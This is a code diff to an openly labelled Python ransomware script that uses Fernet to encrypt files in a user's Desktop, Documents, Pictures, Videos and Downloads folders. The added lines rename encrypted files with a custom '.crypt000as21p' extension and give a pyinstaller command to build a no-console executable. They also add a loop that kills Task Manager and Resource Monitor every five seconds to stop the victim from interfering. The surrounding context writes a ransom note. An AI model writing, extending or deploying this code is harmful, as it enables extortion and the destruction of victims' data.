@@ -1,11 +1,13 @@
 # Always encryption %userprofile%/Desktop, %userprofile%/Documents, %userprofile%/Pictures, %userprofile%/Videos, %userprofile%/Downloads
 # No console update v1.0.2+
+# pyinstaller --onefile --icon=NONE --noconsole abc_ransomware_decrypt_v0_1_2_noconsole_update.py
+# Crypt file: *.*.crypt000as21p
 
-import os
+import time, os, psutil, sys
 from cryptography.fernet import Fernet
 
 def encrypt_file(file_path, key):
-    if not os.path.isfile(file_path):
+    if not os.path.isfile(file_path) or file_path.endswith('.crypt000as21p'):
         return
         
     try:
@@ -15,6 +17,10 @@ def encrypt_file(file_path, key):
         encrypted_data = fernet.encrypt(data)
         with open(file_path, 'wb') as file:
             file.write(encrypted_data)
+        
+        new_file_path = file_path + '.crypt000as21p'
+        os.rename(file_path, new_file_path)
+
     except Exception as e:
         print
 
@@ -65,5 +71,13 @@ def main():
         info_file.write("Note: Do not try to recover your files by yourself or use third-party software, as it may lead to permanent data loss.\n")
         info_file.write("If you have any questions, please contact us immediately.\n")
             
+    while True:
+        for process in psutil.process_iter(['name']):
+            if process.info['name'] and process.info['name'].lower() in ['taskmgr.exe', 'resmon.exe']:
+                print("Process detected: " + process.info['name'])
+                process.kill()
+        time.sleep(5)
+        
+    
 if __name__ == "__main__":
     main()
